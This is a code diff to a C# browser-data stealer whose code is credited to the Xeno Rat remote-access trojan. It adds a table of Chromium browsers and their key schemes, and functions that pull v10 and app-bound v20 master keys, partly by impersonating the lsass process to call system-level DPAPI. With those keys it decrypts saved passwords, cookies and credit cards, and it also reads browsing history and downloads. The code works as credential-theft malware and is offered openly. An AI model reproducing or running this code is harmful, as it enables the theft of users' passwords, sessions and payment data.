@@ -12,8 +12,25 @@ using System.Security.Principal;
 using System.Text;
 using System.Web.Script.Serialization;
 
+public enum MasterPasswordType
+{
+    v10,
+    v20,
+    v20_2,
+    None
+}
+
 namespace chrome_v20_decryption_CSharp
 {
+    public struct Browser
+    {
+        public string name;
+        public MasterPasswordType loginsMP;
+        public MasterPasswordType cookiesMP;
+        public MasterPasswordType ccMP;
+        public string rootPath;
+    }
+
     internal class Program
     {
         static void Main(string[] args)
@@ -196,46 +213,98 @@ namespace chrome_v20_decryption_CSharp
         }
     }
 
-    //This part is taken from Xeno Rat https://github.com/moom825/xeno-rat
+    //This part is taken from Xeno Rat https://github.com/moom825/xeno-rat and has since been heaviliy modified.
     public class Chromium
     {
         private static string local_appdata = Environment.GetEnvironmentVariable("LOCALAPPDATA");
         private static string roaming_appdata = Environment.GetEnvironmentVariable("APPDATA");
 
-        public static Dictionary<string, string> browsers = new Dictionary<string, string>
+        public static Dictionary<string, Browser> browsers = new Dictionary<string, Browser>
         {
-            { "amigo", $"{local_appdata}\\Amigo\\User Data" },
-            { "torch", $"{local_appdata}\\Torch\\User Data" },
-            { "kometa", $"{local_appdata}\\Kometa\\User Data" },
-            { "orbitum", $"{local_appdata}\\Orbitum\\User Data" },
-            { "cent-browser", $"{local_appdata}\\CentBrowser\\User Data" },
-            { "7star", $"{local_appdata}\\7Star\\7Star\\User Data" },
-            { "sputnik", $"{local_appdata}\\Sputnik\\Sputnik\\User Data" },
-            { "vivaldi", $"{local_appdata}\\Vivaldi\\User Data" },
-            { "google-chrome-sxs", $"{local_appdata}\\Google\\Chrome SxS\\User Data" },
-            { "google-chrome", $"{local_appdata}\\Google\\Chrome\\User Data" },
-            { "epic-privacy-browser", $"{local_appdata}\\Epic Privacy Browser\\User Data" },
-            { "microsoft-edge", $"{local_appdata}\\Microsoft\\Edge\\User Data" },
-            { "uran", $"{local_appdata}\\uCozMedia\\Uran\\User Data" },
-            { "yandex", $"{local_appdata}\\Yandex\\YandexBrowser\\User Data" },
-            { "brave", $"{local_appdata}\\BraveSoftware\\Brave-Browser\\User Data" },
-            { "iridium", $"{local_appdata}\\Iridium\\User Data" },
-            { "chromium", $"{local_appdata}\\Chromium\\User Data" },
-            { "qqbrowser", $"{local_appdata}\\Tencent\\QQBrowser\\User Data" },
-            { "chromeplus", $"{local_appdata}\\ChromePlus\\User Data" },
-            { "chedot", $"{local_appdata}\\Chedot\\User Data" },
-            { "coowon", $"{local_appdata}\\Coowon\\User Data" },
-            { "liebao", $"{local_appdata}\\Cheetah Mobile\\Liebao Browser\\User Data" },
-            { "qip-surf", $"{local_appdata}\\QIP\\Surf\\User Data" },
-            { "comodo", $"{local_appdata}\\Comodo\\Dragon\\User Data" },
-            { "360browser", $"{local_appdata}\\360SE\\User Data" },
-            { "maxthon3", $"{local_appdata}\\Maxthon3\\User Data" },
-            { "coccoc", $"{local_appdata}\\CocCoc\\Browser\\User Data" },
-            { "chromodo", $"{local_appdata}\\Comodo\\Chromodo\\User Data" },
-            { "blackhawk", $"{local_appdata}\\Netgate\\BlackHawk\\User Data" },
-
-            { "opera", $"{roaming_appdata}\\Opera Software\\Opera Stable" },
-            { "opera-gx", $"{roaming_appdata}\\Opera Software\\Opera GX Stable" }
+            { "arc", new Browser {
+                name = "arc",
+                loginsMP = MasterPasswordType.v10,
+                cookiesMP = MasterPasswordType.v10,
+                ccMP = MasterPasswordType.v10,
+                rootPath = $"{local_appdata}\\Packages\\TheBrowserCompany.Arc_ttt1ap7aakyb4\\LocalCache\\Local\\Arc\\User Data"
+            }},
+            { "vivaldi", new Browser {
+                name = "vivaldi",
+                loginsMP = MasterPasswordType.v10,
+                cookiesMP = MasterPasswordType.v10,
+                ccMP = MasterPasswordType.v10,
+                rootPath = $"{local_appdata}\\Vivaldi\\User Data"
+            }},
+            { "google-chrome", new Browser {
+                name = "google-chrome",
+                loginsMP = MasterPasswordType.v20,
+                cookiesMP = MasterPasswordType.v20,
+                ccMP = MasterPasswordType.v20,
+                rootPath = $"{local_appdata}\\Google\\Chrome\\User Data"
+            }},
+            { "google-chrome-beta", new Browser {
+                name = "google-chrome-beta",
+                loginsMP = MasterPasswordType.v20,
+                cookiesMP = MasterPasswordType.v20,
+                ccMP = MasterPasswordType.v20,
+                rootPath = $"{local_appdata}\\Google\\Chrome Beta\\User Data"
+            } },
+            { "google-chrome-dev", new Browser {
+                name = "google-chrome-dev",
+                loginsMP = MasterPasswordType.v20,
+                cookiesMP = MasterPasswordType.v20,
+                ccMP = MasterPasswordType.v20,
+                rootPath = $"{local_appdata}\\Google\\Chrome Dev\\User Data"
+            }},
+            //{ "google-chrome-canary", new Browser {
+            //    name = "google-chrome-canary",
+            //    loginsMP = MasterPasswordType.v20,
+            //    cookiesMP = MasterPasswordType.v20,
+            //    ccMP = MasterPasswordType.v20,
+            //    rootPath = $"{local_appdata}\\Google\\Chrome SxS\\User Data"
+            //}},
+            { "microsoft-edge", new Browser {
+                name = "microsoft-edge",
+                loginsMP = MasterPasswordType.v10,
+                cookiesMP = MasterPasswordType.v20_2,
+                ccMP = MasterPasswordType.v20_2,
+                rootPath = $"{local_appdata}\\Microsoft\\Edge\\User Data"
+            }},
+            { "brave", new Browser {
+                name = "brave",
+                loginsMP = MasterPasswordType.v20_2,
+                cookiesMP = MasterPasswordType.v20_2,
+                ccMP = MasterPasswordType.v20_2,
+                rootPath = $"{local_appdata}\\BraveSoftware\\Brave-Browser\\User Data"
+            }},
+            { "chromium", new Browser {
+                name = "chromium",
+                loginsMP = MasterPasswordType.v10,
+                cookiesMP = MasterPasswordType.v10,
+                ccMP = MasterPasswordType.v10,
+                rootPath = $"{local_appdata}\\Chromium\\User Data"
+            }},
+            { "duckduckgo", new Browser {
+                name = "duckduckgo",
+                loginsMP = MasterPasswordType.None,
+                cookiesMP = MasterPasswordType.v10,
+                ccMP = MasterPasswordType.None,
+                rootPath = $"{local_appdata}\\Packages\\DuckDuckGo.DesktopBrowser_ya2fgkz3nks94\\LocalState\\EBWebView"
+            }},
+            { "opera", new Browser {
+                name = "opera",
+                loginsMP = MasterPasswordType.v10,
+                cookiesMP = MasterPasswordType.v10,
+                ccMP = MasterPasswordType.v10,
+                rootPath = $"{roaming_appdata}\\Opera Software\\Opera Stable"
+            }},
+            { "opera-gx", new Browser {
+                name = "opera-gx",
+                loginsMP = MasterPasswordType.v10,
+                cookiesMP = MasterPasswordType.v10,
+                ccMP = MasterPasswordType.v10,
+                rootPath = $"{roaming_appdata}\\Opera Software\\Opera GX Stable"
+            }},
         };
 
         private string[] profiles = {
@@ -253,11 +322,15 @@ namespace chrome_v20_decryption_CSharp
             List<Login> loginList = new List<Login>();
             foreach (var browser in browsers)
             {
-                string path = browser.Value;
+                string path = browser.Value.rootPath;
                 if (!Directory.Exists(path))
                     continue;
 
-                byte[] masterKey = GetV20MasterKey($"{path}\\Local State");
+                byte[] masterKey = null;
+                if (browser.Value.loginsMP == MasterPasswordType.v10) masterKey = GetV10MasterKey($"{path}\\Local State");
+                else if (browser.Value.loginsMP == MasterPasswordType.v20) masterKey = GetV20MasterKey($"{path}\\Local State");
+                else if (browser.Value.loginsMP == MasterPasswordType.v20_2) masterKey = GetV20_2MasterKey($"{path}\\Local State");
+                else if (browser.Value.loginsMP == MasterPasswordType.None) continue;
                 if (masterKey == null)
                     continue;
 
@@ -268,7 +341,7 @@ namespace chrome_v20_decryption_CSharp
                         continue;
                     try
                     {
-                        List<Login> loginData = GetLoginData(profilePath, masterKey);
+                        List<Login> loginData = GetLoginData(browser.Value, profilePath, masterKey);
                         if (loginData == null) continue;
                         loginList.AddRange(loginData);
                     }
@@ -284,11 +357,15 @@ namespace chrome_v20_decryption_CSharp
             List<Cookie> cookieList = new List<Cookie>();
             foreach (var browser in browsers)
             {
-                string path = browser.Value;
+                string path = browser.Value.rootPath;
                 if (!Directory.Exists(path))
                     continue;
 
-                byte[] masterKey = GetV20MasterKey($"{path}\\Local State");
+                byte[] masterKey = null;
+                if (browser.Value.cookiesMP == MasterPasswordType.v10) masterKey = GetV10MasterKey($"{path}\\Local State");
+                else if (browser.Value.cookiesMP == MasterPasswordType.v20) masterKey = GetV20MasterKey($"{path}\\Local State");
+                else if (browser.Value.cookiesMP == MasterPasswordType.v20_2) masterKey = GetV20_2MasterKey($"{path}\\Local State");
+                else if (browser.Value.cookiesMP == MasterPasswordType.None) continue;
                 if (masterKey == null)
                     continue;
 
@@ -315,7 +392,7 @@ namespace chrome_v20_decryption_CSharp
             List<WebHistory> webHistoryList = new List<WebHistory>();
             foreach (var browser in browsers)
             {
-                string path = browser.Value;
+                string path = browser.Value.rootPath;
                 if (!Directory.Exists(path))
                     continue;
 
@@ -340,7 +417,7 @@ namespace chrome_v20_decryption_CSharp
             List<Download> downloadsList = new List<Download>();
             foreach (var browser in browsers)
             {
-                string path = browser.Value;
+                string path = browser.Value.rootPath;
                 if (!Directory.Exists(path))
                     continue;
 
@@ -365,11 +442,15 @@ namespace chrome_v20_decryption_CSharp
             List<CreditCard> creditCardsList = new List<CreditCard>();
             foreach (var browser in browsers)
             {
-                string path = browser.Value;
+                string path = browser.Value.rootPath;
                 if (!Directory.Exists(path))
                     continue;
 
-                byte[] masterKey = GetV20MasterKey($"{path}\\Local State");
+                byte[] masterKey = null;
+                if (browser.Value.ccMP == MasterPasswordType.v10) masterKey = GetV10MasterKey($"{path}\\Local State");
+                else if (browser.Value.ccMP == MasterPasswordType.v20) masterKey = GetV20MasterKey($"{path}\\Local State");
+                else if (browser.Value.ccMP == MasterPasswordType.v20_2) masterKey = GetV20_2MasterKey($"{path}\\Local State");
+                else if (browser.Value.ccMP == MasterPasswordType.None) continue;
                 if (masterKey == null)
                     continue;
 
@@ -389,53 +470,51 @@ namespace chrome_v20_decryption_CSharp
             }
             return creditCardsList;
         }
-        private List<Login> GetLoginData(string path, byte[] masterKey)
+        private List<Login> GetLoginData(Browser browser, string path, byte[] masterKey)
         {
-            string loginDbPath = Path.Combine(path, "Default", "Login Data");
-            if (!File.Exists(loginDbPath))
-            {
-                loginDbPath = Path.Combine(path, "Login Data");
-                if (!File.Exists(loginDbPath)) return null;
-            }
-
-            string tempDbPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
-            File.Copy(loginDbPath, tempDbPath, true);
             List<Login> logins = new List<Login>();
+            string[] loginDataNames = { "Login Data", "Login Data For Account" };
 
-            try
+            foreach (string ldn in loginDataNames)
             {
-                SQLiteReader.SQLiteReader conn = new SQLiteReader.SQLiteReader(tempDbPath);
-                if (!conn.ReadTable("logins"))
+                string loginDbPath = Path.Combine(path, ldn);
+                if (!File.Exists(loginDbPath)) return null;
+
+                string tempDbPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
+                File.Copy(loginDbPath, tempDbPath, true);
+                
+                try
+                {
+                    SQLiteReader.SQLiteReader conn = new SQLiteReader.SQLiteReader(tempDbPath);
+                    if (!conn.ReadTable("logins"))
+                    {
+                        logins = null;
+                        return null;
+                    }
+
+                    for (int i = 0; i < conn.GetRowCount(); i++)
+                    {
+                        string password = conn.GetValue(i, "password_value");
+                        string username = conn.GetValue(i, "username_value");
+                        string url = conn.GetValue(i, "action_url");
+
+                        if (password == null || username == null || url == null) continue;
+
+                        password = DecryptPwd(Encoding.Default.GetBytes(password), masterKey);
+                        if (string.IsNullOrEmpty(password) || string.IsNullOrEmpty(username))
+                        {
+                            continue;
+                        }
+                        logins.Add(new Login(url, username, password));
+                    }
+                }
+                catch (Exception ex)
                 {
                     logins = null;
-                    return null;
                 }
 
-                for (int i = 0; i < conn.GetRowCount(); i++)
-                {
-                    string password = conn.GetValue(i, "password_value");
-                    string username = conn.GetValue(i, "username_value");
-                    string url = conn.GetValue(i, "action_url");
-
-                    Console.WriteLine($"url = {url}");
-
-                    if (password == null || username == null || url == null) continue;
-
-                    password = DecryptPwd(Encoding.Default.GetBytes(password), masterKey);
-                    if (string.IsNullOrEmpty(password) || string.IsNullOrEmpty(username))
-                    {
-                        continue;
-                    }
-                    logins.Add(new Login(url, username, password));
-                }
+                File.Delete(tempDbPath);
             }
-            catch (Exception ex)
-            {
-                Console.WriteLine(ex.ToString());
-                logins = null;
-            }
-
-            File.Delete(tempDbPath);
             return logins;
         }
 
@@ -443,11 +522,7 @@ namespace chrome_v20_decryption_CSharp
         private List<Cookie> GetCookies(string path, byte[] masterKey)
         {
             string cookieDbPath = Path.Combine(path, "Network", "Cookies");
-            if (!File.Exists(cookieDbPath))
-            {
-                cookieDbPath = Path.Combine(path, "Default", "Network", "Cookies");
-                if (!File.Exists(cookieDbPath)) return null;
-            }
+            if (!File.Exists(cookieDbPath)) return null;
 
             List<Cookie> cookies = new List<Cookie>();
             string tempDbPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
@@ -501,8 +576,7 @@ namespace chrome_v20_decryption_CSharp
         private List<WebHistory> GetWebHistory(string path)
         {
             string historyDbPath = Path.Combine(path, "History");
-            if (!File.Exists(historyDbPath))
-                return null;
+            if (!File.Exists(historyDbPath)) return null;
 
             List<WebHistory> history = new List<WebHistory>();
 
@@ -546,8 +620,7 @@ namespace chrome_v20_decryption_CSharp
         private List<Download> GetDownloads(string path)
         {
             string downloadsDbPath = Path.Combine(path, "History");
-            if (!File.Exists(downloadsDbPath))
-                return null;
+            if (!File.Exists(downloadsDbPath)) return null;
 
             List<Download> downloads = new List<Download>();
 
@@ -590,8 +663,8 @@ namespace chrome_v20_decryption_CSharp
         private List<CreditCard> GetCreditCards(string path, byte[] masterKey)
         {
             string cardsDbPath = Path.Combine(path, "Web Data");
-            if (!File.Exists(cardsDbPath))
-                return null;
+            if (!File.Exists(cardsDbPath)) return null;
+
             List<CreditCard> cards = new List<CreditCard>();
             string tempDbPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
             File.Copy(cardsDbPath, tempDbPath, true);
@@ -634,6 +707,30 @@ namespace chrome_v20_decryption_CSharp
             return cards;
         }
 
+        private static byte[] GetV10MasterKey(string path)
+        {
+            if (!File.Exists(path))
+                return null;
+
+            string content = File.ReadAllText(path);
+            if (!content.Contains("os_crypt"))
+                return null;
+
+            JavaScriptSerializer serializer = new JavaScriptSerializer();
+            dynamic jsonObject = serializer.Deserialize<dynamic>(content);
+
+            if (jsonObject != null && jsonObject.ContainsKey("os_crypt"))
+            {
+                string encryptedKeyBase64 = jsonObject["os_crypt"]["encrypted_key"];
+                byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64);
+
+                byte[] masterKey = Encoding.Default.GetBytes(Encoding.Default.GetString(encryptedKey, 5, encryptedKey.Length - 5));
+
+                return ProtectedData.Unprotect(masterKey, null, DataProtectionScope.CurrentUser);
+            }
+            return null;
+        }
+
         private static byte[] GetV20MasterKey(string path)
         {
             try
@@ -669,6 +766,49 @@ namespace chrome_v20_decryption_CSharp
                     if (kb == null) return null;
 
                     return deriveV20MasterKey(kb);
+                }
+                return null;
+            }
+            catch
+            {
+                return null;
+            }
+        }
+
+        private static byte[] GetV20_2MasterKey(string path)
+        {
+            try
+            {
+                if (!File.Exists(path))
+                    return null;
+
+                string content = File.ReadAllText(path);
+                if (!content.Contains("os_crypt"))
+                    return null;
+
+                JavaScriptSerializer serializer = new JavaScriptSerializer();
+                dynamic jsonObject = serializer.Deserialize<dynamic>(content);
+
+                if (jsonObject != null && jsonObject.ContainsKey("os_crypt"))
+                {
+                    string encryptedKeyBase64 = jsonObject["os_crypt"]["app_bound_encrypted_key"];
+                    byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64);
+                    byte[] masterKey = Encoding.Default.GetBytes(Encoding.Default.GetString(encryptedKey, 4, encryptedKey.Length - 4));
+
+                    var imp = new Impersonate();
+                    imp.Impersonatelsass();
+                    byte[] keyBlobSystemDecrypted = ProtectedData.Unprotect(masterKey, null, DataProtectionScope.LocalMachine);
+                    if (keyBlobSystemDecrypted == null) return null;
+                    imp.UnImpersonatelsass();
+
+                    byte[] keyBlobUserDecrypted = keyBlobUserDecrypted = ProtectedData.Unprotect(keyBlobSystemDecrypted, null, DataProtectionScope.CurrentUser);
+                    if (keyBlobUserDecrypted == null) return null;
+
+                    //Now we parse the key blob
+                    KeyBlob2 kb = ParseKeyBlob2(keyBlobUserDecrypted);
+                    if (kb == null) return null;
+
+                    return kb.blob2;
                 }
                 return null;
             }
@@ -814,6 +954,32 @@ namespace chrome_v20_decryption_CSharp
                     return null;
                 }
 
+                return parsed;
+            }
+        }
+
+        public class KeyBlob2
+        {
+            public byte[] blob1 { get; set; }
+            public byte[] blob2 { get; set; }
+        }
+
+        public static KeyBlob2 ParseKeyBlob2(byte[] blobData)
+        {
+            if (blobData == null) return null;
+
+            using (MemoryStream ms = new MemoryStream(blobData))
+            using (BinaryReader reader = new BinaryReader(ms))
+            {
+                KeyBlob2 parsed = new KeyBlob2();
+
+                int blob1len = reader.ReadInt32();
+                if (blob1len > blobData.Length - 4) return null;
+                parsed.blob1 = reader.ReadBytes((int)blob1len);
+
+                int blob2len = reader.ReadInt32();
+                if (blob2len > blobData.Length - 4 - blob1len - 4) return null;
+                parsed.blob2 = reader.ReadBytes((int)blob2len);
                 return parsed;
             }
         }
